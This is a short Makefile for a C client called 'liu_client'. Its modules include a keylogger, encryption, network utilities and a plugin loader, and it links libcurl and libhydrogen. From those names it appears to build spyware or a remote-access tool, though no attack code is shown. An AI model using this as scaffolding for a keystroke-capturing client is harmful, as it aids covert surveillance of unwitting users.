# FLAGS
CC = gcc
CFLAGS = -c -Wall -Wextra -std=gnu11 -O0 -g
LDLIBS = -ldl -lpthread -lcurl $(LIBPATH)libhydrogen.a

TARGET = "liu_client"

# PATHS
SRCPATH = src/
INCLUDE = include/
OBJPATH = build/
LIBPATH = lib/
PLGPATH = plugins/
PSRPATH = plugins_src/

OBJECTS = $(OBJPATH)core.o $(OBJPATH)network_utils.o $(OBJPATH)system_utils.o $(OBJPATH)keylogger.o $(OBJPATH)encrypt.o $(OBJPATH)plugin_utils.o
PLUGINS = $(PLGPATH)test.so

# EXEC CREATION
$(TARGET): $(PLGPATH) $(PLGPATH) $(PLUGINS) $(OBJPATH) $(OBJPATH) $(OBJECTS)
	@echo -n "Linking objects..."
	@$(CC) $(OBJECTS) -o $@ $(LDLIBS)
	@echo " [OK]"

$(OBJPATH):
	@mkdir $(OBJPATH)

# OBJECT CREATION
$(OBJPATH)%.o: $(SRCPATH)%.c
	@echo -n "Building $@..."
	@$(CC) -I $(INCLUDE) $(CFLAGS) $< -o $@
	@echo " [OK]"

$(PLGPATH):
	@mkdir $(PLGPATH)

# LIBRARY CREATION
$(PLGPATH)%.so: $(PLGPATH)%.o
	@echo -n "Building plugin $@..."
	@$(CC) -shared $< -o $@
	@echo " [OK]"

# PLUGIN OBJECT CREATION
$(PLGPATH)%.o: $(PSRPATH)%.c
	@echo -n "Building plugin $@..."
	@$(CC) -I $(INCLUDE) $(CFLAGS) $< -o $@
	@echo " [OK]"

# COMMANDS
all: clean $(TARGET)

valgrind:
	valgrind --leak-check=full --show-leak-kinds=all $(TARGET)

clean:
	@echo -n "Removing objects files..."
	@rm -rf $(OBJPATH) $(TARGET) $(PLGPATH)
	@echo " [OK]"
